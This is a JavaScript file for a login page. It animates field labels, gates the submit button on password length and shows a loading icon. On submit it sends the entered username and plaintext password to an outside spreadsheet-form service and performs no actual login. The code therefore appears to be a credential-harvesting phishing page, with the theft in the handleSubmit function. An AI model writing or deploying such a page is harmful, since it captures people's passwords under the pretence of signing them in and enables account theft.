const inputs = document.querySelectorAll(".input");
const button = document.querySelector(".login__button");

const handleFocus = ({ target }) => {
  const span = target.previousElementSibling;
  span.classList.add("span-active");
};

const handleFocusOut = ({ target }) => {
  if (target.value === "") {
    const span = target.previousElementSibling;
    span.classList.remove("span-active");
  }
};

const handleChange = () => {
  const [username, password] = inputs;

  if (username.value && password.value.length >= 8) {
    button.removeAttribute("disabled");
  } else {
    button.setAttribute("disabled", "");
  }
};

inputs.forEach((input) => input.addEventListener("focus", handleFocus));
inputs.forEach((input) => input.addEventListener("focusout", handleFocusOut));

inputs.forEach((input) => input.addEventListener("input", handleChange));

const addLoading = () => {
  button.innerHTML =
    '<img src="./img/loading-process-svgrepo-com.svg" class="loading">';
};

const removeLoading = () => {
  button.innerHTML = '<img src="./img/iconmonstr-arrow-right-lined.svg">';
};

// addLoading();

const handleSubmit = (event) => {
  event.preventDefault();
  addLoading();

  const username = document.querySelector('input[name="username"]').value;
  const password = document.querySelector('input[name="password"]').value;

  fetch("https://api.sheetmonkey.io/form/fU6NWj6uTX3zL88BUs5nVz", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ username, password }),
  }).then(() => removeLoading());
};

document.querySelector("form").addEventListener("submit", handleSubmit);
